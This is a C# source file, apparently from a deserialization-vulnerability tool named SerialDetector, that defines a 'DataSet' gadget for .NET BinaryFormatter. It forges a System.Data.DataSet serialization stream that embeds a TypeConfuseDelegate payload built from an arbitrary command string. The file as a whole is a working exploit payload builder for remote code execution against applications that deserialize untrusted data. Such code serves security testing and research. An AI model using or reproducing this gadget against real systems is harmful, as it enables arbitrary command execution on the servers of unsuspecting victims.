using System;
using System.Data;
using System.IO;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Binary;

namespace SerialDetector.KnowledgeBase.Gadgets
{
    internal sealed class DataSet : IGadget
    {
        // https://media.blackhat.com/bh-us-12/Briefings/Forshaw/BH_US_12_Forshaw_Are_You_My_Type_WP.pdf
        [Serializable]
        public class DataSetMarshal : ISerializable
        {
            object fakeTable;
            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(typeof(System.Data.DataSet));
                info.AddValue("DataSet.RemotingFormat", System.Data.SerializationFormat.Binary);
                info.AddValue("DataSet.DataSetName", "");
                info.AddValue("DataSet.Namespace", "");
                info.AddValue("DataSet.Prefix", "");
                info.AddValue("DataSet.CaseSensitive", false);
                info.AddValue("DataSet.LocaleLCID", 0x409);
                info.AddValue("DataSet.EnforceConstraints", false);
                info.AddValue("DataSet.ExtendedProperties", (PropertyCollection)null);
                info.AddValue("DataSet.Tables.Count", 1);
                
                var fmt = new BinaryFormatter();
                var stm = new MemoryStream();
                fmt.Serialize(stm, fakeTable);

                info.AddValue("DataSet.Tables_0", stm.ToArray());
            }
            
            public DataSetMarshal(object fakeTable)
            {
                this.fakeTable = fakeTable;
            }
        }

        public object Build(string command) => 
            new DataSetMarshal(new TypeConfuseDelegate().Build(command));
    }
}